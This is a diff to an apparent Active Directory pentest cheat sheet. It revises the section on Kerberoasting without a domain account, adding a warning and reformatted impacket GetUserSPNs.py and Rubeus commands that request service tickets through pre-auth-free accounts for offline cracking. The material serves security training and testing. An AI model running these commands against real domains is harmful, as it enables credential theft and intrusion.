@@ -60,7 +60,7 @@
     - [Pass-the-Ticket Sapphire Tickets](#pass-the-ticket-sapphire-tickets)
   - [Kerberoasting](#kerberoasting)
   - [KRB_AS_REP Roasting](#krb_as_rep-roasting)
-  - [Kerberoasting w/o domain account](#kerberoast-without-preauth)
+  - [Kerberoasting w/o domain account](#kerberoasting-wo-domain-account)
   - [CVE-2022-33679](#cve-2022-33679)
   - [Timeroasting](#timeroasting)
   - [Pass-the-Hash](#pass-the-hash)
@@ -1987,21 +1987,24 @@ C:\Rubeus> john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproa
 **Mitigations**: 
 * All accounts must have "Kerberos Pre-Authentication" enabled (Enabled by Default).
 
+
 ## Kerberoasting w/o domain account
 
-In September 2022 a vulnerability was discovered by [Charlie Clark](https://exploit.ph/), ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account.
-If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an KRB_AS_REQ request and trick the request to ask for a ST instead for a kerberoastable principal, by modifying the sname attribut in the req-body part of the request.
+> In September 2022 a vulnerability was discovered by [Charlie Clark](https://exploit.ph/), ST (Service Tickets) can be obtained through KRB_AS_REQ request without having to control any Active Directory account. If a principal can authenticate without pre-authentication (like AS-REP Roasting attack), it is possible to use it to launch an **KRB_AS_REQ** request and trick the request to ask for a **ST** instead of a **encrypted TGT**, by modifying the **sname** attribute in the req-body part of the request.
 
 The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
-* [GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413)
-```powershell
-GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
-```
+:warning: You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
 
-* [Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139)
-```powershell
-Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413)
+  ```powershell
+  GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
+  ```
+* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139)
+  ```powershell
+  Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
+  ```
+
 
 ## CVE-2022-33679
 
